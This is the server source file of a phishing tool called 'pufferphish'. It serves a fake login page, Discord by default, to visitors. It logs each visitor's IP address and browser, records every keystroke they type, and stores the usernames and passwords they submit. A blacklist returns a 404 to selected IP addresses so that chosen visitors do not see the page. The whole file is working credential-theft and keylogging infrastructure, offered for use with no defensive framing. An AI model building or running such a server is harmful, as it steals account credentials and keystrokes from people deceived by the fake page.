import express from "express"
import { Server } from "socket.io";
import fs from "fs"
import path from "path"
import http from "http"
import Logger from "./log.js"
import { fileURLToPath } from 'url';

// i found the dirname thing on stackoveflow - thanks i guess
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express()
const server = http.createServer(app)
const logger = new Logger()
const io = new Server(server);
let config = {}

try{
  config = JSON.parse(fs.readFileSync("config.json"))
}catch(err){
  logger.error("Error reading 'config.json': "+ err)
}

const template = path.join(
  __dirname, 
  "templates", 
  (config["template"] || "discord")+".html"
)

if(!fs.existsSync(template)){
  logger.error("Template '"+(config["template"] || "discord")+"' not found.")
}

app.use("/static", express.static("static"))

app.all(config["path"] || "/", (req,res)=>{
  if(config["blacklist"] && config.blacklist.includes(req.ip)){
    logger.info("Request from '"+req.ip+"' which is blacklisted, returning with 404")
    return res.status(404).send("404 not found") 
  }
  
  res.sendFile(path.join(
    __dirname, 
    "templates", 
    (config["template"] || "discord")+".html"
  ))
  logger.info("Accepted request from '"+req.ip)
})

app.all("/ip", (req,res)=>{
  const ip = req.get("X-Real-IP") ? req.get("X-Real-IP") : req.ip
  return res.json({ ip: ip })
})

app.all("*", (req,res)=>{
  logger.info("404 request from "+req.ip)
  res.status(404).send("404 not found")
})

io.on("connection", s => { 
  s.on("info", data =>{
    s.ip = data["ip"]
    logger.info(`New connection from ${s.ip}`)
    let log = `==============================
New connection at ${logger.date()}
IP Address: ${data["ip"]}
Browser: ${data["browser"]}`
    logger.log(s.ip, "info", log)
  })

  s.on("disconnect", ()=>{
    if (s.ip === undefined) {
      logger.info("Dead socket connection, disconnecting")
      return s.disconnect()
    }

    logger.info(`Connection closed with ${s.ip}`)
    let log = `\nEnded connection at ${logger.date()}
==============================`
    logger.log(s.ip, "info", log)
  })

  s.on("key", data => {
    if (s.ip === undefined) {
      logger.info("Dead socket connection, disconnecting")
      return s.disconnect()
    }
    
    logger.log(s.ip, "keys", data["key"])
  })

  s.on("submit", data => {
    if (s.ip === undefined) {
      logger.info("Dead socket connection, disconnecting")
      return s.disconnect()
    }

    let log = `==============================
Username: ${data["user"]} 
Password: ${data["pass"]}
==============================`
    logger.log(s.ip, "sumbit", log)
  })
})

server.listen(config["port"] || 8080, () => {
  logger.banner()
  const version = JSON.parse(fs.readFileSync("package.json"))["version"]
  logger.success("Started pufferphish version "+version+" | github.com/ngn13/pufferphish")
  logger.success("Server is listening on port "+server.address().port)
})
